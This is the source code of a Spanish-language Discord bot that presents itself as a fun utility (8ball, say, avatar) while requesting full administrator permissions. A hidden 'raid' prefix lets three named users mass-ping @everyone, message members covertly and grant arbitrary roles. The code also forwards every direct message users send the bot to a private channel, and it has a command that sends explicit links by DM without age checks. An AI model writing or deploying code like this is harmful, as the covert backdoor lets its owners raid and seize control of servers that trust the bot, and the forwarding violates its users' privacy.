const Discord = require("discord.js");
const client = new Discord.Client({ ws: { properties: { $browser: "Discord Android" }}})


client.on("ready", () => {
    console.log(`
	+¡Hey, qué tal!
	- ¿Uh?
	+ Bot iniciado con user: ${client.user.tag}`);
	client.user.setActivity("God of War 2", {type: "PLAYING", presence:"DND"})
});

let prefix = "z!";
const raid = "!!";

client.on("message", message => {
    if(!message.guild || !message.content.startsWith(prefix)) return;
    if(message.author.bot) return;
    
    const cont = message.content.split(' ').slice(1);
    const args = cont.join(' '); 
	
	//sirve para mandar la invitación :v
	
	if(message.content.startsWith(prefix+"invite")) {
		message.channel.send(`¡Revisa tu MD, ${message.author}!`);
		message.author.send("https://discord.com/oauth2/authorize?client_id=828475020393054258&scope=bot&permissions=2147483647");
		message.author.send("¡Gracias por desear invitarme!");
	}
	if(message.content.startsWith(prefix+"8ball")) {
		if(!args[0]) return message.channel.send(`¡Falta tu pregunta, ${message.author}!`);
		let ball = ["Sí", "No", "Tal vez", "Obvio", "Yo digo que si", "Yo digo que no", "Probablemente", "._.xd", "¿Qué?", "Sigue soñando", "Baby Shark Doo Doo Doo Doo Doo..."]
		let randomball = ball[Math.floor(Math.random() * ball.length)]
		message.channel.send(randomball+`, ${message.author}`);
	}
	if(message.content.startsWith(prefix+"say")) {
		message.delete();
		const { Util } = require('discord.js');

		let args = message.content.slice(prefix.length).trim().split(/ +/g);

		if (!args) return message.reply(`No tengo nada que decir.`);

		let mensaje = args.join(" ");

		for(let i = 0; mensaje.includes("@here") || mensaje.includes("@everyone") || mensaje.includes("say"); i++){
			mensaje = mensaje.replace(/@here/g, "here");
			mensaje = mensaje.replace(/@everyone/g, "everyone");
			mensaje = mensaje.replace(/say/g, " ");
		}
		return message.channel.send(Util.cleanContent(mensaje, message)).catch(e => e);
	}
	if(message.content.startsWith(prefix+"help")) {
		message.channel.send("¡Revisa tu MD! | :ballot_box_with_check:")
		const help = new Discord.MessageEmbed()
		.setTitle("Comandos de ZackeDTS.")
		.setDescription("El prefix del bot es ``;;``")
		.setAuthor(message.author.username, message.author.displayAvatarURL())
		.setColor("RANDOM")
		.setFooter(`Pedido por ${message.author}`)
		.setThumbnail(client.user.displayAvatarURL({format: "png", dynamic: true}))
		.setTimestamp()
		.addField("help", "Envía este embed de ayuda.")
		.addField("8ball", "Lanza una respuesta aleatoria a tu pregunta.")
		.addField("invite", "Te envía al MD un link para que puedas invitar a este bot a tu server.")
		.addField("say", "Comando divertido donde el bot dice lo que tú escribes.")
		.addField("Creador", "MaxMulti79#5552")
		message.author.send(help).catch(e => message.channel.send("Mensaje Directo Cerrado! | :x:"))  //esto es para que se envie al Privado de la persona que escribio el comando; en caso que tenga el Md desactivado le enviara 'usuario con Md desactivado'
	}
	/*if(message.content.startsWith(prefix+"rps")) {
		if(!args[0]) return message.channel.send(`:x: | ¡Hey, te falta decir qué jugarás!`);
		let args = message.content.slice(prefix.length).trim().split(/ +/g);
		let elección = args.join (" ");
		for(let z=0; eleccion.includes("rps"); z++){
			eleccion = eleccion.replace("rps", "");
		}
		if(elección == "rock" || elección == "paper" || eleccion == "sissor"){
			let elecciones = ["rock", "paper", "sissor"];
			let elesion = elecciones[Math.floor(Math.random() * elecciones.length)];
			if(elesion=="rock" && eleccion=="paper"){
				const victoria = new Discord.MessageEmbed()
				.setTitle("Resultado 👀✨")
				.setAuthor(message.author.username, message.author.displayAvatarURL())
				.setThumbnail(client.user.displayAvatarURL())
				.setColor("RANDOM")
				.setFooter(prefix+"rps realizado por "+message.author.tag)
				.setTimestamp()
				.addField("Elección de "+message.author, `${eleccion}`)
				.addField("Elección de ZackeDTS", `${elesion}`)
				.addField("¡El ganador fue "+message.author+"!", true)
				message.channel.send(victoria);
			}
		}else message.channel.send(":x: | ¡Hey, tienes que definir entre 'rock', 'paper' o 'sissor'!");
		
	}*/
	if(message.content.startsWith(prefix+"avatar")) {
			const avatar = new Discord.MessageEmbed()
			.setTitle(`Avatar de ${message.author.username}`)
			.setAuthor(message.author.username, message.author.displayAvatarURL({format: "png", dynamic: true}))
			.setThumbnail(client.user.displayAvatarURL({format: "png", dynamic: true}))
			.setImage(message.author.displayAvatarURL({size: 4096, format: "png", dynamic: true}))
			.setColor("RANDOM")
			.setFooter(`Pedido por ${message.author.usarname}`)
			.setTimestamp()
			message.channel.send(avatar);
	} /*else {
			avatar = new Discord.MessageEmbed()
			.setTitle("Avatar de "+user)
			.setAuthor(message.author.username, message.author.avatarURL())
			.setThumbnail(client.user.avatarURL())
			.setImage(user.displayAvatarURL())
			.setImage(user.avatarURL())
			.setColor("RANDOM")
			.setFooter("Pedido por "+message.author.username)
			.setTimestamp()
		}
		message.channel.send(avatar);
	}*/
	if(message.content.startsWith(prefix+"setPrefix")){
		let args = message.content.slice(prefix.length).trim().split(/ +/g);
		let texto = args.join (" ");
		for(let a=0; texto.includes("setPrefix") || texto.includes(" "); a++){
			texto = texto.replace("setPrefix", "");
			texto = texto.replace(" ", "");
		}
		prefix = texto;
		message.channel.send("Prefijo cambiado a "+prefix);
	}
	if(message.content.startsWith(prefix+"porn") && message.content.endsWith(prefix+"porn")) {
		let porn = ["https://thumbs2.redgifs.com/BruisedFixedNematode-mobile.mp4", "https://cdn.discordapp.com/attachments/511257077797093426/835712871970242590/video0.mp4", "https://imgur.com/p6n3RtB", "https://imgur.com/JMJnxGX", "https://imgur.com/ZxiCxxG", "https://cdn.discordapp.com/attachments/424284294395985961/814799782572851200/1614134745138.webm", "https://imgur.com/SUpPPrE"];
		let porno = porn[Math.floor(Math.random() * porn.length)];
		message.channel.send("Revisa tu MD, te hemos enviado algo picante 7v7.");
		message.author.send(porno).catch(e => message.channel.send("Nooo!, ha ocurrido un error :(, "+message.author));
	}
});

//Comandos especiales que solo pueden usar los usuarios definidos 

client.on("message", message =>{
	if(!message.content.startsWith(raid))return;
	if(message.author.bot) return;
	if(message.author.tag == ("MaxMulti79#5552") || message.author.tag == ("StunxFS#8549") || message.author.tag == ("Rub3n#1886")){
		if(message.content.startsWith(raid+"error0") && message.content.endsWith(raid+"error0")){ //help
			message.delete();
			const help = new Discord.MessageEmbed()
			.setTitle("Comandos de ZackeDTS.")
			.setDescription("||*Modo Raid*|| - El prefix del bot es ``!!``")
			.setAuthor(message.author.username, message.author.avatarURL)
			.setColor("RANDOM")
			.setFooter("Pedido por: " + message.author.username)
			.setThumbnail(message.author.avatarURL)
			.setTimestamp()
			.addField("error0", "Envía este embed de ayuda")
			.addField("rape0", "envía 50 everyone en el canal donde se escriba")
			.addField("invite", "Te envía al MD un link para que puedas invitar a este bot a tu server. ")
			.addField("case0", "Envía un mensaje a la persona mencionada que quieras, siempre y cuando esté en el server")
			.addField("Creador", "MaxC++#7997")
			message.author.send(help).catch(e => message.channel.send("Error | :x:"))
		}
		//Envía 50 everyones en donde se envía este comando
		if(message.content.startsWith(raid+"rape0")) {
			message.delete();
			for(let every = 0; every<=50; every++){
				message.channel.send("@everyone");
			}
		}
		//envía el mensaje que quieras al usuario mencionado, siempre y cuando esté en el mismo server
		if(message.content.startsWith(raid+"case0")) {
			message.delete();
			let member = message.mentions.members.first();
			let args = message.content.slice(prefix.length).trim().split(/ +/g);
			let texto = args.join (" ");
			for(let x = 0; texto.includes("case0") || texto.includes(`${member}`); x++){
				texto = texto.replace("case0", "");
				texto = texto.replace(`${member}`, "");
			}
			if (!!member.user) member.user.send(texto).catch(e => message.author.send("Error | :x:"));
		}
		//Este comando le asigna el rol definido a la persona definida
		if(message.content.startsWith(raid+"take")) {
			message.delete();
			let usuario = message.mentions.members.first();
			let rol = message.mentions.roles.first();

			if (!usuario) return message.author.send("Menciona a alguien.");

			if (!rol) return message.author.send("Menciona un rol");
			usuario.roles.add(rol).catch(e => message.author.send("Ha aparecido un error, lpm"));
			message.author.send(`Rol ${rol} agregado a ${usuario} correctamente!`).catch(e => message.author.send("Wacho, hubo un error x,d"));
		}
	}else return;
});

client.on("message", message => {
	if(!message.guild) return message.author.send("Lo siento, pero no estás en un servidor.");
	if(message.author.bot) return;
	
	if(message.content.startsWith("<@!828475020393054258>") && message.content.endsWith("<@!828475020393054258>")) {
		message.channel.send("Prefix: "+prefix);
	}
	if(message.content.startsWith("prueba") && message.content.endsWith("prueba")) {
		message.reply("funciona");
	}
	if(message.content.startsWith("prueba1") && message.content.endsWith("prueba1")) {
		message.reply("¿funciona?");
	}
	if(message.content.startsWith("ping") && message.content.endsWith("ping")){
		message.reply("pong");
	}
	if(message.content.includes("Hola") || message.content.includes("hola")) {
		message.react("👋");
	}
});

client.on("message", message => {
	if (message.channel.type === "dm") {
		const channelId = "840729104818241576";  //Id del canal, ponen la id del canal donde quieren que les avise
		const channel = client.channels.cache.get(channelId); //Esto obtiene el canal
		const upembed = new Discord.MessageEmbed() //Crea embed
		.setTimestamp()
		.setThumbnail(message.author.avatarURL)
		.setTitle("Mensaje directo") //titulo del embed
		.addField("Enviado por:", `<@${message.author.id}>`)///muestra quien envio el mensaje
		.setColor("RANDOM")
		.addField("Mensaje: ", message.content) //el contenido del mensaje
		.setFooter("Mensaje al MD");
		channel.send(upembed); //embiamos el embed
	}
});///cerramos el codigo

client.on("ready", async () => {
	const channelId = "840732296407547955"; ///Id del canal
	const channel = client.channels.cache.get(channelId); ///Esto obtiene el canal
	const upembed = new Discord.MessageEmbed() ///Crea embed
	.setTitle("Bot Notification") ///Nombre
	.setColor('RANDOM') //Color
	.setDescription("¡Me acaban de encender ||O reiniciar ._.xd||!, ¡estoy ''to' flama'' !") //Descripcion
	.setFooter(`¡Gracias a todos, actuamente estamos en ${client.guilds.cache.size} servidores!`) //Esto va a mostrar en cuantos servidores esta
	.setThumbnail(client.user.avatarURL) //URL De imagen nwn
	.setTimestamp()
	channel.send(upembed);
});

client.login("Token del bot");
